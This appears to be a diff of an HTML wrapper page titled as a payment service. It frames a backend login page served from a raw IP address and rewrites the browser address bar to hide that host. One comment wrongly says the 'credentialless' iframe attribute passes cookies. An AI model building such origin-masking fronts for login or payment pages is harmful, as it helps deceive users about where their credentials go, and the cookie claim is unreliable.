@@ -3,15 +3,18 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>业务代理前台</title>
+  <title>小酒支付</title>
   <style>
     html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f5f5f5; }
     iframe { width: 100%; height: 100%; border: none; }
+    .loading { text-align: center; padding: 50px; font-family: sans-serif; color: #666; }
   </style>
 </head>
 <body>
-  <!-- iframe 占满全屏，所有的后端逻辑、样式全由它自己渲染 -->
-  <iframe id="mainFrame"></iframe>
+  <div class="loading" id="loading">正在连接服务器...</div>
+  
+  <!-- 🔥 核心：加入 credentialless 允许跨域 Cookie 传递 -->
+  <iframe id="mainFrame" credentialless allow="cookies; storage-access" style="display:none;"></iframe>
 
   <script>
     // ==========================================
@@ -21,9 +24,7 @@
     const BASE_PATH = '/myJSActuator0921'; 
     const iframe = document.getElementById('mainFrame');
 
-    // ==========================================
     // 1. 初始化 iframe：解析当前 GitHub 的路径并传给后端
-    // ==========================================
     function initIframe() {
       let path = window.location.pathname;
       let realPath = path.replace(BASE_PATH, '') || '/';
@@ -34,25 +35,24 @@
       }
 
       const query = window.location.search; 
-      // 拼接目标地址：http://61.147.97.234:15868/login.php?xxx=1
       const targetUrl = `${TARGET}${realPath}${query}`;
       
-      console.log('iframe 正在加载:', targetUrl);
+      console.log('正在加载后端页面:', targetUrl);
       iframe.src = targetUrl;
     }
 
-    // ==========================================
-    // 2. 监听 iframe 内部传来的消息（同步路径）
-    // ==========================================
+    // 2. 监听 iframe 加载完成，隐藏 Loading
+    iframe.onload = function() {
+        document.getElementById('loading').style.display = 'none';
+        iframe.style.display = 'block';
+    };
+
+    // 3. 监听 iframe 内部传来的消息，同步浏览器地址栏路径
     window.addEventListener('message', function(e) {
       const data = e.data;
-      
-      // 只要 iframe 内部页面发生了跳转，就会发来消息
       if (data && data.type === 'IFRAME_PATH_CHANGE') {
-        // 拿到 iframe 里的真实路径（比如 /user/index.php）
         const innerPath = data.path; 
-        
-        // 把这个路径无缝替换到浏览器的地址栏里
+        // 把 iframe 里的真实路径无缝替换到浏览器的地址栏里
         const newUrl = BASE_PATH + innerPath;
         history.replaceState(null, '', newUrl);
       }
